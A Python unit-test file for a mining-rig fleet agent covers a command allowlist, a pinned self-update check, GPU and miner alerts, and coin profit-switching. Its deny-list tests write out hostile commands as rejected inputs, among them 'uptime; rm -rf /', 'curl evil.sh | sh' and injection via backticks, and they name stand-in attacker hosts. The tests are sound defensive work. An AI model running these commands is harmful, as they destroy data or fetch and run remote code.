#!/usr/bin/env python3
"""Unit tests for the fleet agent's exec allowlist (W3 B1 security bound)."""
import unittest

import agent


class ExecAllowlistTests(unittest.TestCase):
    def test_allows_default_prefixes(self):
        for cmd in ("uptime", "nvidia-smi --query-gpu=name --format=csv",
                    "systemctl restart zion-miner", "journalctl -n 50",
                    "tmux ls", "pkill -f SRBMiner", "bash /root/restart.sh"):
            self.assertTrue(agent.exec_allowed(cmd), cmd)

    def test_denies_shell_metachars(self):
        for cmd in ("uptime; rm -rf /", "uptime|sh", "uptime && id",
                    "uptime > /tmp/x", "cat $(/etc/passwd)", "uptime`id`",
                    "nvidia-smi\nid"):
            self.assertFalse(agent.exec_allowed(cmd), cmd)

    def test_denies_offlist_and_interpreter_prefixes(self):
        for cmd in ("rm -rf /", "bash -c 'id'", "python3 -c 'x'",
                    "sh -c id", "tmux new-session -d id",
                    "tmux send-keys -t s id Enter", "eval id",
                    "curl evil.sh | sh"):
            self.assertFalse(agent.exec_allowed(cmd), cmd)

    def test_empty_and_blank_denied(self):
        self.assertFalse(agent.exec_allowed(""))
        self.assertFalse(agent.exec_allowed("   "))
        self.assertFalse(agent.exec_allowed(None))

    def test_custom_allowlist(self):
        allow = ["echo ok", "minerctl"]
        self.assertTrue(agent.exec_allowed("echo ok done", allow))
        self.assertTrue(agent.exec_allowed("minerctl restart", allow))
        self.assertFalse(agent.exec_allowed("uptime", allow))


class SelfUpdateTests(unittest.TestCase):
    """self-update op: https + host allowlist + sha256 pin (CP token
    alone must not be code-signing capability)."""

    def test_valid_update_url_https_and_allowlist(self):
        self.assertTrue(agent.valid_update_url(
            "https://raw.githubusercontent.com/x/y/agent.py"))
        self.assertTrue(agent.valid_update_url(
            "https://zionterranova.com/fleet/agent.py"))
        for bad in ("http://zionterranova.com/a.py",          # no https
                    "https://evil.example.com/a.py",        # off-list
                    "file:///etc/passwd",                   # no scheme
                    "https://zionterranova.com.evil.com/x", # suffix spoof
                    "", "notaurl"):
            self.assertFalse(agent.valid_update_url(bad), bad)

    def test_self_update_rejects_bad_url_and_hash(self):
        rc, out = agent.self_update({"url": "https://evil.com/a.py",
                                     "sha256": "0" * 64})
        self.assertEqual(rc, 126)
        self.assertIn("host", out)
        rc, out = agent.self_update({
            "url": "https://zionterranova.com/a.py", "sha256": "xyz"})
        self.assertEqual(rc, 126)
        self.assertIn("sha256", out)


class FleetAlertTests(unittest.TestCase):
    """CP alert engine (W7 B5): miner_down / gpu_temp / hashrate_drop
    fire once per state transition and recover with hysteresis."""

    def setUp(self):
        import tempfile
        import vastctl
        self.v = vastctl
        self.tmp = tempfile.NamedTemporaryFile(
            suffix=".json", delete=False)
        self.tmp.close()
        vastctl.AGENT_DB_FILE = self.tmp.name
        self.now = 1_700_000_000.0
        # one rig heartbeating now, applied an active srbminer sheet
        self.sheet = {"miner": "srbminer-dual", "coin": "qtu",
                      "wallet": "w", "pool": "stratum://x"}
        self.db = {
            "rigs": {"rig-a": {
                "heartbeat": {"server_ts": self.now,
                              "hostname": "rig-a-host",
                              "gpus": ["RTX 3060, 50 %, 60 C, 120 W, 40 %"],
                              "miners": ["SRBMiner-MULTI --worker vast-rig-a-qtu"],
                              "applied_sheet": {
                                  "hash": vastctl._sheet_hash(self.sheet)}},
                "tasks": [], "results": []}},
            "desired": {"rigs": {"rig-a": dict(self.sheet)}, "groups": {}},
            "secrets": {}, "events": [], "catalog": {}}
        vastctl._agents_cache = self.db

    def _kinds(self, fired):
        return [k for k, _, _ in fired]

    def test_miner_down_fires_once_and_recovers(self):
        db = self.db
        rig = db["rigs"]["rig-a"]
        rig["heartbeat"]["miners"] = []           # miner dead
        fired = self.v._check_alerts(db, self.now)
        self.assertIn("alert_miner_down", self._kinds(fired))
        fired = self.v._check_alerts(db, self.now + 60)
        self.assertNotIn("alert_miner_down", self._kinds(fired))  # dedup
        rig["heartbeat"]["miners"] = ["SRBMiner-MULTI x"]
        fired = self.v._check_alerts(db, self.now + 120)
        self.assertIn("alert_miner_recovered", self._kinds(fired))

    def test_miner_down_skips_unapplied_or_inactive(self):
        db = self.db
        rig = db["rigs"]["rig-a"]
        rig["heartbeat"]["miners"] = []
        rig["heartbeat"]["applied_sheet"] = {"hash": "other-hash"}
        self.assertEqual(self.v._check_alerts(db, self.now), [])
        # sheet applied but miner=stop → no alert expected
        rig["heartbeat"]["applied_sheet"] = {
            "hash": self.v._sheet_hash(self.sheet)}
        db["desired"]["rigs"]["rig-a"]["miner"] = "stop"
        self.assertEqual(self.v._check_alerts(db, self.now), [])

    def test_gpu_temp_alert_and_hysteresis_recovery(self):
        db = self.db
        rig = db["rigs"]["rig-a"]
        rig["heartbeat"]["gpus"] = ["RTX 3060, 50 %, 90 C, 120 W, 40 %"]
        fired = self.v._check_alerts(db, self.now)
        self.assertIn("alert_gpu_temp", self._kinds(fired))
        self.assertNotIn("alert_gpu_temp",
                         self._kinds(self.v._check_alerts(db, self.now + 1)))
        rig["heartbeat"]["gpus"] = ["RTX 3060, 50 %, 83 C, 120 W, 40 %"]
        self.assertEqual(self.v._check_alerts(db, self.now + 2), [])
        rig["heartbeat"]["gpus"] = ["RTX 3060, 50 %, 79 C, 120 W, 40 %"]
        self.assertIn("alert_temp_recovered",
                      self._kinds(self.v._check_alerts(db, self.now + 3)))

    def test_hashrate_drop_vs_own_baseline(self):
        db = self.db
        rig = db["rigs"]["rig-a"]
        sheet_hash = rig["heartbeat"]["applied_sheet"]["hash"]
        rig["hps_ring"] = [
            {"ts": self.now - 2000 - i, "hps": 1000.0, "sheet": sheet_hash}
            for i in range(10)]
        workers = [{"worker": "vast-rig-a-host-qtu", "hps": 500.0}]
        fired = self.v._check_alerts(db, self.now, workers=workers)
        self.assertIn("alert_hashrate_drop", self._kinds(fired))
        workers[0]["hps"] = 950.0
        fired = self.v._check_alerts(db, self.now + 60, workers=workers)
        self.assertIn("alert_hps_recovered", self._kinds(fired))

    def test_hashrate_ring_scoped_to_sheet(self):
        """A sheet switch must not inherit the old coin's baseline."""
        db = self.db
        rig = db["rigs"]["rig-a"]
        rig["hps_ring"] = [
            {"ts": self.now - 2000 - i, "hps": 1000.0, "sheet": "old-sheet"}
            for i in range(10)]
        workers = [{"worker": "vast-rig-a-host-qtu", "hps": 1.0}]
        self.assertNotIn("alert_hashrate_drop",
                         self._kinds(
                             self.v._check_alerts(db, self.now,
                                                  workers=workers)))


class ProfitSwitchTests(unittest.TestCase):
    """Autopilot evaluation: bench table + hysteresis + mode gates."""

    def setUp(self):
        import tempfile
        import vastctl
        self.v = vastctl
        self.tmp = tempfile.NamedTemporaryFile(
            suffix=".json", delete=False)
        self.tmp.close()
        vastctl.AGENT_DB_FILE = self.tmp.name
        vastctl.PROFIT_SWITCH_MODE = "dry"
        vastctl.PROFIT_EVAL_S = 0
        vastctl.PROFIT_COOLDOWN_S = 0
        self.now = 1_700_000_000.0
        self.sheet = {"miner": "srbminer-dual", "coin": "qtu",
                      "wallet": "w", "pool": "stratum://x",
                      "autopilot": ["mine-qtu", "mine-xmr"]}
        self.db = {
            "rigs": {"rig-a": {
                "heartbeat": {"server_ts": self.now,
                              "hostname": "rig-a",
                              "gpus": ["RTX 3060, 50 %, 60 C, 120 W, 40 %"],
                              "miners": ["SRBMiner-MULTI x"],
                              "applied_sheet": {
                                  "hash": vastctl._sheet_hash(
                                      {k: v for k, v in self.sheet.items()
                                       if not k.startswith("_")})}},
                "tasks": [], "results": []}},
            "desired": {"rigs": {"rig-a": dict(self.sheet)}, "groups": {}},
            "catalog": {
                "mine-qtu": {"miner": "srbminer-dual", "coin": "qtu"},
                "mine-xmr": {"miner": "xmrig", "coin": "xmr"}},
            "bench": {"RTX_3060": {"qtu": {"hps": 1000, "usd_day": 0.40},
                                   "xmr": {"hps": 8000, "usd_day": 0.95}}},
            "secrets": {}, "events": []}
        vastctl._agents_cache = self.db

    def tearDown(self):
        self.v.PROFIT_SWITCH_MODE = ""

    def test_gpu_model_normalization(self):
        self.assertEqual(
            self.v._gpu_model(
                {"gpus": ["NVIDIA GeForce RTX 3060, 50 %, 60 C"]}),
            "RTX_3060")

    def test_dry_mode_emits_recommendation_without_switching(self):
        fired = self.v._check_profit(self.db, self.now)
        self.assertIn("profit_switch", [k for k, _, _ in fired])
        # desired untouched in dry mode
        self.assertEqual(
            self.db["desired"]["rigs"]["rig-a"]["coin"], "qtu")
        evs = [e for e in self.db["events"] if e["kind"] == "profit_switch"]
        self.assertEqual(len(evs), 1)
        self.assertIn("qtu→xmr", evs[0]["detail"])

    def test_apply_mode_rewrites_desired(self):
        self.v.PROFIT_SWITCH_MODE = "apply"
        fired = self.v._check_profit(self.db, self.now)
        self.assertIn("profit_switch", [k for k, _, _ in fired])
        new = self.db["desired"]["rigs"]["rig-a"]
        self.assertEqual(new["coin"], "xmr")
        self.assertEqual(new["autopilot"], ["mine-qtu", "mine-xmr"])

    def test_hysteresis_blocks_marginal_switch(self):
        self.db["bench"]["RTX_3060"]["xmr"]["usd_day"] = 0.45  # +12 % < 15 %
        self.assertEqual(self.v._check_profit(self.db, self.now), [])

    def test_off_mode_is_noop(self):
        self.v.PROFIT_SWITCH_MODE = ""
        self.assertEqual(self.v._check_profit(self.db, self.now), [])

    def test_bench_set_normalizes_and_merges(self):
        out = self.v.agent_bench_set("nvidia rtx-3070", "ZANO",
                                     hps=120, usd_day=0.3)
        self.assertEqual(out["gpu"], "RTX_3070")
        self.assertEqual(out["coin"], "zano")
        self.assertIn("zano", self.db["bench"]["RTX_3070"])


if __name__ == "__main__":
    unittest.main()
